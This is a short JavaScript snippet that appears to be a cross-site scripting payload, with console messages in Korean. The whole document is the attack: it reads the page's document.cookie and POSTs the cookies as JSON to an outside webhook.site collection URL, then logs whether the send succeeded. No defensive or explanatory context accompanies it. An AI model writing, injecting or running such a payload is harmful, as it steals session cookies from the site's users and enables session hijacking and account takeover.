(function() {
    const webhookUrl = 'https://webhook.site/dde0021c-614f-4dc0-b6fc-25294beae606';

    const cookies = document.cookie;

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ cookies: cookies })
    })
    .then(response => response.text())
    .then(result => console.log('웹훅으로 전송 완료:', result))
    .catch(error => console.error('웹훅 전송 실패:', error));
})();
